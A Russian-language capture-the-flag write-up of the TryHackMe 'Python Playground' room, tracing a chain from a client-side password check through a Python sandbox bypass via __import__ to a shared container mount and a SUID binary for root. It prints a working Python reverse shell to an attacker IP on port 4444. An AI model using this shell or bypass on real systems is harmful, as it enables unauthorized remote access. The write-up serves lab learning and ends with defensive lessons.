# Python Playground: «песочница», в которой остался `__import__`

**Машина:** [Python Playground](https://tryhackme.com/room/pythonplayground) (hard, Linux)
**Цепочка:** nikto → админка → питон-«песочница» → обход импортов → shared mount → SUID → root.

## Разведка

22 и 80. nikto находит `/admin.html` — там реально работающий логин и, в исходнике страницы, ссылка на `super-secret-admin-testing-panel.html` плюс JS, из которого собирается пароль. Панель исполняет питон-код.

## Обход «песочницы»

Импорты режут, но `__import__` — встроенная функция, её фильтр не трогает:

```python
s = __import__('socket'); sp = __import__('subprocess'); os = __import__('os'); pty = __import__('pty')
s = s.socket(s.AF_INET, s.SOCK_STREAM)
s.connect(("IP", 4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```

curl и wget в окружении нет — поэтому чистый питон. Декодируем JS из admin.html → пароль → SSH под юзером.

## Эскалация через shared mount

Песочница крутится в контейнере. Создаём в нём файл с уникальным именем, ищем на хосте — находим в `/var/log/`. Значит, `/mnt/log/` контейнера = `/var/log/` хоста, причём файлы пишутся от root. Пишем туда бинарник, вешаем SUID, юзер его запускает — root.

## Заметка

Три мелких ошибки, сложенные в ряд: проверка пароля на клиенте, песочница по deny-листу имён и общий mount с кривыми правами. Каждая по себе «да ладно, так не делают» — вместе дают root. Проверки на клиенте — не защита, а театр.
